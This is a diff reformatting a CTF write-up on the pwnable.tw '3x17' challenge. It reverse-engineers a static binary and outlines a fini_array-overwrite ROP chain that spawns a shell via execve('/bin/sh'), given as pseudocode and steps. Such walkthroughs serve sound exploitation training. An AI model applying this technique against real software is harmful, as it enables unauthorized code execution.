@@ -10,38 +10,38 @@ The challenge is reachble to: nc chall.pwnable.tw 10105.
 
 As usual extracts the binary information:
 
-´
-[0x00401c0e]> iI
-arch     x86
-baddr    0x400000
-binsz    759016
-bintype  elf
-bits     64
-***canary   false***
-class    ELF64
-compiler GCC: (Ubuntu 8.2.0-7ubuntu1) 8.2.0
-crypto   false
-endian   little
-havecode true
-laddr    0x0
-lang     c
-linenum  false
-lsyms    false
-machine  AMD x86-64 architecture
-maxopsz  16
-minopsz  1
-***nx       true***
-os       linux
-pcalign  0
-pic      false
-relocs   false
-rpath    NONE
-sanitiz  false
-static   true
-stripped true
-subsys   linux
-va       true
-`
+```
+    [0x00401c0e]>
+    arch     x86
+    baddr    0x400000
+    binsz    759016
+    bintype  elf
+    bits     64
+    ***canary   false***
+    class    ELF64
+    compiler GCC: (Ubuntu 8.2.0-7ubuntu1) 8.2.0
+    crypto   false
+    endian   little
+    havecode true
+    laddr    0x0
+    lang     c
+    linenum  false
+    lsyms    false
+    machine  AMD x86-64 architecture
+    maxopsz  16
+    minopsz  1
+    ***nx       true***
+    os       linux
+    pcalign  0
+    pic      false
+    relocs   false
+    rpath    NONE
+    sanitiz  false
+    static   true
+    stripped true
+    subsys   linux
+    va       true
+```
 
 So the stack is not executable and the canary is not enabled.
 This leads to think that the vulnerability here could not be just a stack overflow.
@@ -50,8 +50,8 @@ This leads to think that the vulnerability here could not be just a stack overfl
 
 Let's run the binary with `strace ./3x17` to understand how it works at syscall-level.
 
-`
-▶ strace ./3x17
+```
+$ strace ./3x17
 execve("./3x17", ["./3x17"], 0x7ffcce4b4520 /\* 37 vars \*/) = 0
 brk(NULL)                               = 0x1087000
 brk(0x10881c0)                          = 0x10881c0
@@ -70,11 +70,9 @@ NULL, 24)                       = -1 EFAULT (Bad address)
 exiti\_group(0)                           = ?
 +++ exited with 0 +++
 
-mcamp@mcamp-VirtualBox:CTFS/pwnable.tw/3x17-150-pts  main ✗
-12d20h ◒  
-▶ Hello world
+$ Hello world
 zsh: command not found: Hello
-`
+```
 
 What the program does:
 
@@ -107,17 +105,17 @@ Anyway now, let's dig into the code.
 
 As usual, let's dump all the functions using `radare2`.
 
-`
+```
 [0x00401c0e]> afl | wc -l
 464
 [0x00401c0e]> afl | grep main
 0x00401b6d    6 224          main
-`
+```
 
 Ok it is quite big, but we got a `main`.
 Let's analyze it.
 
-`
+```
 [0x00401c0e]> pddo @ main
                    | /* r2dec pseudo code output */
                    | /* /home/mcamp/Desktop/CTFS/pwnable.tw/3x17-150-pts/3x17 @ 0x401b6d */
@@ -165,16 +163,15 @@ Let's analyze it.
     0x00401c4c     |     return rax;
                    | }
 [0x00401c0e]> 
-`
-Comparing the main function to the strace done, seems that each function corresponds to a system call especially for
-***fcn_00446ec0*** and ***fcn_00446e20***.
+```
+Comparing the main function to the strace done, seems that each function corresponds to a system call especially for ***fcn_00446ec0*** and ***fcn_00446e20***.
 
 ***fcn_0040ee70*** is an interesting function, it does not take any argument and returns a 32 bit value.
 The value returned is then used into ***fcn_00446e20***.
 
 Let's dig into each single function.
 
-`
+```
 [0x00401c0e]> pddo @ fcn.00446ec0
                    | /* r2dec pseudo code output */
                    | /* /home/mcamp/Desktop/CTFS/pwnable.tw/3x17-150-pts/3x17 @ 0x446ec0 */
@@ -221,18 +218,18 @@ Let's dig into each single function.
     0x00446f57     |     }
                    | }
 [0x00401c0e]> 
-`
+```
 
 Since:
 
-`
+```
 [0x00401c0e]> pxw @ 0x04ba80c
 0x004ba80c  0x00000000 0x00000000 0x00000000 0x00000000  ................
-`
+```
 
 The syscall is executed at address ***0x00446ecf*** with the arguments passed to this function and it is a `write()`.
 
-`
+```
 [0x00401c0e]> pddo @  fcn.00446e20
                    | /* r2dec pseudo code output */
                    | /* /home/mcamp/Desktop/CTFS/pwnable.tw/3x17-150-pts/3x17 @ 0x446e20 */
@@ -279,13 +276,13 @@ The syscall is executed at address ***0x00446ecf*** with the arguments passed to
     0x00446eb7     |     }
                    | }
 [0x00401c0e]> 
-`
+```
 
 The syscall is executed at address ***0x00446e2c*** with the arguments passed to this function and it is a `write()`.
 
 At this point let's dig into: ***fcn.0040ee70***:
 
-`
+```
 [0x00401c0e]> pddo @ fcn.0040ee70
                    | /* r2dec pseudo code output */
                    | /* /home/mcamp/Desktop/CTFS/pwnable.tw/3x17-150-pts/3x17 @ 0x40ee70 */
@@ -297,19 +294,19 @@ At this point let's dig into: ***fcn.0040ee70***:
     0x0040ee77     |     return void (*0x40fce0)() ();
                    | }
 [0x00401c0e]> 
-`
+```
 
 This function is just a wrapper for: ***0x40fce0***, let's dig into this.
 The function is quite big:
-`
+```
 [0x0040ee77]> pddo @ 0x40fce0 | wc -l
 380
-`
+```
 
 In this function there are a lot of branches, this makes hard to understand statically the code flow, it is required a debugging session.
 Put a breakpoint to on ***0x0040fd7a*** let's see what happens here:
 
-`
+```
  0x0040fce0     | int64\_t fcn\_0040fce0 (int64\_t arg1, int64\_t arg2, uint32\_t arg3) {
                    |     cf = arg1;
                    |     rip = arg2;
@@ -343,7 +340,7 @@ Put a breakpoint to on ***0x0040fd7a*** let's see what happens here:
     0x0040fd84     |         rax = *(rbx);
     0x0040fd88     |         rsi = rax;
                    |     } while ((*((rcx + rax*2 + 1)) & 0x20) != 0);
-`
+```
 
 On ***0x0040fd7a*** `rbx = buf\_inserted\_stack`, `rax = buf\_inserted\_stack[0]` and `rcx = 0x00496040` so the compare is true if and only if `rcx[rax\*2 +1] == 0`
 If the check fails a loop over the buffer inserted is executed with the same logic.
@@ -353,7 +350,7 @@ The `while ((*((rcx + rax*2 + 1)) & 0x20) != 0);` could theorically go out of me
 
 This comparison is in under our control, but let's see what happens then...
 
-`
+```
     0x0040fd88     |         rsi = rax;
                    |     } while ((\*((rcx + rax\*2 + 1)) & 0x20) != 0);
                    | label_16:
@@ -378,9 +375,9 @@ This comparison is in under our control, but let's see what happens then...
     0x0040fdcc     |     if (r14 != 0) {
     0x0040fdcc     |         goto label_22;
     0x0040fdcc     |     }
-`
+```
 
-*** NOTE ***
+***NOTE***
 sil represents the lower 16 bits of rsi.
 
 At this point in order to waste less time in debugging a weird code a fuzzing approach was used.
@@ -391,7 +388,7 @@ The fuzzer script is in `fuzzer.sh`.
 
 Using the fuzzer that weird code was uncovered.
 
-*** NOTE ***
+***NOTE***
 The fuzzer will store in a file the input that leads to a read(0, value != NULL, 0x18).
 This file could be used in debug mode with radare2 as standard input using `dor stdin=file.hex`.
 Then putting a breakpoint on ***0x00401bf2*** it's possible to see the weird code processing results.
@@ -406,25 +403,25 @@ Before searching a way to exploit, come back to the weird code to understand at 
 Since each digit 0-9 is in ascii represented from 0x30 to 0x39, just thinks about an easy way to do this.
 The most easy could be something similar to this:
 
-`
+```
 b = byte inserted
 result = 0
 if b - 0x30 < 9
 	b is a digit
 else
 	b is not a digit
-`
+```
 
 The related code is here:
 
-`
+```
 0x0040fe49     |         edi = rsi - 0x30;
 0x0040fe50     |         if (dil > 9) {
 0x0040fe55     |             if (rbp != 0) {
 0x0040fe55     |                 goto label\_26;
 0x0040fe55     |             }
 0x0040fe5b     |             esi = (int32\_t) sil;
-`
+```
 
 So now it is possible to find how the final `rax` is built starting from the single digit.
 
@@ -438,24 +435,24 @@ Naif thoughts: writing into the stack makes no sense since we do not have a memo
 So something like ret2libc could be used?
 Unfortunately not since:
 
-`
-mcamp@mcamp-VirtualBox:CTFS/pwnable.tw/3x17-150-pts  main ✗ 12d22h ◒
-▶ rabin2 -l 3x17
+```
+$ rabin2 -l 3x17
 [Linked libraries]
 
 0 library
-`
+```
 
 Ok, maybe a ROP could help...
 But it is needed to find where attach the ROP.
 
+***NOTE***
 The ROP (Return Oriented Programming) is an exploiting technique that exploits the existent code to bypass the NX protection.
 Chunks of the code (Gadgets) are chained together to create a code flow. The code flow is given by some initial conditions (registers value).
 What if we can write into the stack but not executing it? Well, it's possible to write on the return function the address of a gadget and on the
 `ret` instruction the gadget is executed. The gadget must be chained in some way, exploiting the jumps (JOP) or the ret (ROP).
 Below an example:
 
-`
+```
 gadget\_1 at 0x100  mov rsi, 10; ret
 gadget\_2 at 0x376  mov rdi, 16; ret
 gadget\_3 at 0x500  mov rdx, 20; ret
@@ -472,6 +469,7 @@ STACK after writing into it:
 0x320F8: addr_of(gadget\_2)
 0x320F0: addr_of(gadget\_1)
 0x320E8: first local variable.
+```
 
 On the ret the gadget\_1 is executed and on the gadget\_1's ret the gadget\_2 is executed and so on, chained together.
 
@@ -481,7 +479,7 @@ Let's see after the main function what happens.
 
 Ops, below there is an interesting snippet called from `entry0` function after the `main` execution:
 
-`
+```
 [0x0040295c]> pd 24 @ 0x00402960
             ; DATA XREF from entry0 @ 0x401a5f
             ;-- rdx:
@@ -508,13 +506,13 @@ Ops, below there is an interesting snippet called from `entry0` function after t
         ┌─< 0x0040299c      e98bb90800     jmp section..fini
         │   0x004029a1      662e0f1f8400.  nop word cs:[rax + rax]
         │   0x004029ab      0f1f440000     nop dword [rax + rax]
-`
+```
 
 At ***0x00402988*** a call to `rbp[rbx\*8]` and debugging seems that `rbp = 0x004b40f0 = section..fini\_array` and `rbx = 2`.
 Uhm,`fini\_array` it is just an array containing destructors ( declared through atexit() or gcc builtins ).
 The fini\_array should be writable, let see:
 
-`
+```
 [0x0040295c]> iS
 [Sections]
 
@@ -549,12 +547,13 @@ nth paddr          size vaddr         vsize perm name
 26  0x000b82d0     0x23 0x00000000     0x23 ---- .comment
 27  0x000b82f4   0x10c0 0x00000000   0x10c0 ---- .note.stapsdt
 28  0x000b93b4    0x134 0x00000000    0x134 ---- .shstrtab
-`
+```
+
 As expected the section is writable, so this could be the target!
 
 The previous snippet can be resumed in the following way:
 
-`
+```
 rbx = 1
 rbp = 0x004b40f0
 do other things
@@ -562,7 +561,7 @@ while rbx != 0
 	call rbx[rbx*8]
 	rbx--
 end while
-`
+```
 
 Since it's possible to write 24 bytes on the second read, we can control at least two calls
 writing two different addresses. Unfortunately checking with [one\_gadget](https://github.com/david942j/one_gadget)
@@ -575,7 +574,8 @@ when `rbx == 1` the main is executed and when `rbx == 0` the first instruction o
 Through this loop multiple gadgets could be loaded in fini\_array (until the writable memory is available).
 
 Pseudo snippet from the exploit:
-`
+
+```
 offset = 0
 i = 0
 addr = 0x004b40f0
@@ -594,20 +594,21 @@ while true:
 	write(gadget\_ddr[i] + gadget\_addr[i+1])
 	offset += 16
 	i++
-`
+```
+
 Now the only problem is how to trigger the ROP execution, an idea could be to use the `LEAVE` assembly's instruction to
 change the stack and increment the new stack pointer.
 
-*** NOTE ***
+***NOTE***
 LEAVE: is an instruction used to exit from a function, basically it is used to restore the previous stack frame.
 Since when a function is called a new stack frame is created, when a function returns the stack frame must be destroyed.
 The previous frame pointer is stored in the register ***rbp***.
 The LEAVE instruction can be resumed as:
-`
+
+```
 rsp = rbp;
 pop rbp; // rbp = rsp[0]; rsp += 8
-`
-
+```
 
 Fantastic a gadget that does a LEAVE basically set the stack to rbp+8 that points to our main and to trigger the ROP
 is needed a `ret` instruction so a gadget like LEAVE + RET is used. This gadget will execute the jump to the ***0x004b40f0[16]***.
@@ -615,7 +616,7 @@ What if at ***0x004b40f0[16]*** there is the address of another gadget like `ins
 Yes it is executed and on the its `ret` the core tries to call the address at ***0x004b40f0[24]*** and so on.
 Theoretically a ROP chain is built.
 
-*** NOTE ***
+***NOTE***
 The LEAVE+RET gadget is the one that trigger the ROP so is the last one to insert in memory!
 
 The exploit at this point is very clear:
@@ -632,12 +633,12 @@ On the 6th step the gadget LEAVE+ret is executed and then the Gadget1 is execute
 Now It is time to find gadgets to execute a shell: `execve("/bin/sh", NULL, NULL)`.
 Registers configuration:
 
-`
+```
 rax = 59
 rdi = addr\_of("/bin/sh")
 rsi = 0
 rdx = 0
-`
+```
 
 On the step 4 instead writing two gadgets, it's better writing a gadget and a value. In this way the gadget needed are the ones like:
 `pop \*; ret;` since there is a pop the stack goes forward to the next gadget and never calls the value we put!
@@ -659,7 +660,7 @@ So the pseudo exploit now is:
 13. Write Addr 0x004b40f0
 14. Write LEAVE+RET gadget.
 
-*** NOTE ***
+***NOTE***
 It is important to notice that each gadget must end in a ret otherwise the next gadget is not executed!
 Of course if a gadget uses a `pop` the next gadget in the table is at current+16, since a pop increment the stack
 pointer and a ret too.
